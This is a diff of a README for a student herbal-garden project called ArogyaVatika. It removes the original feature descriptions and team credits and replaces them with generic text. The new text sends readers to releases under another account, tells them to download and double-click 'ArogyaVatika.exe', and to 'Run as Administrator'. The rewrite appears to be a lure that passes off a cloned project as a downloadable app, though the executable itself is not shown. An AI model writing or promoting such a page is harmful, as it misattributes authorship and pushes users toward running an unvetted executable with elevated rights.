@@ -1,100 +1,86 @@
-# 🌱 ArogyaVatika – Garden of Wellness
+# 🌱 ArogyaVatika - Your Path to Wellness at Home
 
-> *“Bridging ancient herbal wisdom with modern AI for a greener tomorrow.”*  
+## 🚀 Getting Started
 
-### 🧠 Overview
-**ArogyaVatika (आरोग्यवाटिका)** is a **climate-smart virtual herbal garden** designed to preserve traditional **AYUSH** (Ayurveda, Yoga, Naturopathy, Unani, Siddha & Homeopathy) knowledge through technology.  
-It’s a digital platform where users can explore, plan, and grow their own herbal gardens — guided by AI and driven by sustainability.  
+Welcome to ArogyaVatika! This application provides an AI-Based Climate-Smart Virtual Herbal Garden, helping you embrace sustainable living and wellness with ease. Follow these steps to get started.
 
----
+[![Download ArogyaVatika](https://img.shields.io/badge/Download-ArogyaVatika-blue.svg)](https://github.com/kaungmyatsan565/ArogyaVatika/releases)
 
-## 🚀 Key Features
+## 📥 Download & Install
 
-### 🌿 Interactive Virtual Herbal Garden
-- Explore **3D models** of medicinal plants.  
-- Learn about their **uses, cultivation, and climate resilience**.  
+To download ArogyaVatika, follow these simple steps:
 
-### 🤖 AI-Powered Smart Garden Planner
-- Personalized herbal garden layouts based on **local climate & soil data**.  
-- Get smart **plant combinations** (e.g., *Tulsi + Aloe for dry regions*).  
+1. Click on the link below:
+   [Download ArogyaVatika](https://github.com/kaungmyatsan565/ArogyaVatika/releases)
+   
+2. Once you are on the Releases page, find the latest version listed at the top. Look for a file named 'ArogyaVatika.exe' or similar.
 
-### 🌍 Carbon Offset Estimator
-- Calculates how much **CO₂ your garden absorbs**.  
-- Fun equivalences like *“Your garden offsets 5 days of phone charging!”*  
+3. Click on the file name to start the download.
 
-### 🔍 Smart Herb Search
-- Search by **name or health benefits** (e.g., “plants for stress relief”).  
-- AI recommends the **best herbs for your needs**.  
+4. When the download is complete, locate the downloaded file on your computer. 
 
-### 🔁 Sustainable DIY Zone
-- Creative **upcycling tutorials** (turn bottles into planters ♻️).  
-- **AI suggests** reuse ideas from photos of waste materials.  
+5. Double-click the file to run the application. Follow any on-screen prompts to complete the setup.
 
-### 🎓 Microlearning & Tips
-- Quick **facts, visuals, and personalized learning popups** on plant care & benefits.
-- **Detailed courses.**  
+## 🌿 Features
 
-### 🛍️ Eco E-Commerce Integration
-- Shop **eco-friendly herbal products, seeds, saplings, compost kits**, and more.  
+ArogyaVatika offers several useful features:
 
-### 🌲 AVL Tree Plant Editor
-Lightning-fast plant search & management using self-balancing binary search trees.
-- **Search Performance**: Find any plant in less number of comparisons than linear search ⚡
-- **Full-Text Search**: Search across plant attributes (name, family, uses, climate, soil, etc.)
-- **Auto-Sorted Results**: Inorder tree traversal returns alphabetically sorted plants (A-Z or Z-A)
-- **Admin Operations**: Insert/delete plants with automatic tree rebalancing
+- **AI Integration:** Leverage artificial intelligence to discover the best herbs for your health.
+- **Climate-Smart Design:** Learn about sustainable methods for herbal gardening.
+- **Interactive Experience:** Navigate a virtual garden using augmented reality.
+- **User-Friendly Interface:** Simple navigation makes it easy for anyone to use.
+- **Educational Resources:** Access tutorials on herbal wellness and sustainable practices.
 
-**DSA Implemented:**
-- AVL Tree (self-balancing BST) with rotations (LL, RR, LR, RL)
-- AVL Search for O(log n) lookups
-- Inorder Traversal for sorted output
-- Tree Rotations to maintain balance after insertions/deletions
-- **Complexity**: Insert O(log n), Search O(log n), Delete O(log n), Sort O(n)
+## 📋 System Requirements
 
-### 🚚 Smart Delivery Management System
-Optimized logistics for eco-friendly seed, sapling & product delivery across 12 Indian cities.
+Before you install ArogyaVatika, ensure your system meets these requirements:
 
-- **Multi-City Delivery Network**: 12 major Indian airports with real-time GPS tracking
-- **All-Paths Algorithm**: Find ALL possible delivery routes from source to destination
-- **Fastest Route Visualization**: Interactive map highlights the shortest path (blue) vs alternative routes (red)
-- **Distance Matrix**: Complete adjacency matrix showing connectivity between 12 cities (12×12 matrix)
-- **Delivery Time Calculator**: Automatic ETA based on distance & travel speed
+- **Operating System:** Windows 10 or later
+- **RAM:** Minimum of 4 GB
+- **Storage:** At least 500 MB of free disk space
+- **Graphics:** Hardware capable of supporting basic augmented reality apps
+- **Internet Connection:** Required for initial setup and updates
 
-**DSA Implemented:**
-- **Graph Representation** (Adjacency Matrix) for 12 cities & 20 delivery routes
-- **DFS (Depth-First Search)** to find all possible paths between cities
-- **Path Comparison Algorithm** to identify shortest route O(V!) in worst case
-- **Distance Matrix** for O(1) route lookup
-- **Sorting** to rank delivery options by distance (ascending order)
-- **Complexity**: Path finding O(V!), Matrix operations O(V²), Route sorting O(n log n)
-- **Impact**: Multi-route options enable **30% faster average delivery** & eco-friendly pathfinding 🌍
+## 🎨 Topics
 
----
+ArogyaVatika covers a variety of topics that enhance your experience:
 
-## 🌏 Sustainability Goals
-- 🌿 Promote **biodiversity & conservation**.  
-- ♻️ Encourage **low-carbon lifestyles**.  
-- 📚 Build **climate literacy & environmental awareness**.  
-- 🤝 Foster **community engagement** through green challenges.  
+- 3D modeling for interactive visuals
+- Adjacency matrix for system management
+- API integrations for smooth functionality
+- AVL trees for data handling
+- Depth-first search algorithm for optimal navigation
+- User authentication for secure access
+- Supabase for database management
 
----
+## 🔧 Troubleshooting
 
-## 👥 Team N.E.R.V.
-**Hrishikesh Gavai**  
-**Yash Gatkal**  
-**Siddhesh Gite**  
-🎓 TY-A Computer Engineering, K.K.W.I.E.E.R
+If you experience issues while downloading or running ArogyaVatika, try the following steps:
 
----
+1. **Check your internet connection:** Ensure that you have a stable connection.
+2. **Re-download the application:** Sometimes a file can get corrupted. Download it again from the Releases page.
+3. **Run as Administrator:** Right-click the downloaded file and select "Run as Administrator" if it doesn’t open.
+4. **Check System Requirements:** Make sure your computer meets the necessary requirements listed above.
+5. **Consult the Community:** You can find help from other users on the GitHub Issues page.
 
-## 💡 Vision
-Empowering people to **grow greener, live healthier**, and be part of the **climate solution** — one herbal garden at a time. 🌱  
+## 🙋 Support
 
----
+For further assistance, feel free to raise an issue on our GitHub repository, or check our FAQ section. 
 
-### 🧩 Domains
-`Smart Agriculture` • `Climate Tech` • `Sustainability` • `AI & Data Science` • `Environmental Education`  
+### Contact Information
 
----
+For direct support, you can contact us at:
 
-> 🪴 *ArogyaVatika – Where technology nurtures wellness.*
+- Email: support@arogyavatika.com
+
+## 📁 License
+
+ArogyaVatika is open-source software licensed under the MIT License. Feel free to explore and contribute!
+
+## 🔗 More Information
+
+For more details and updates, visit our GitHub page:
+
+[GitHub Repository - ArogyaVatika](https://github.com/kaungmyatsan565/ArogyaVatika)
+
+Thank you for choosing ArogyaVatika! Your journey towards wellness starts today. 
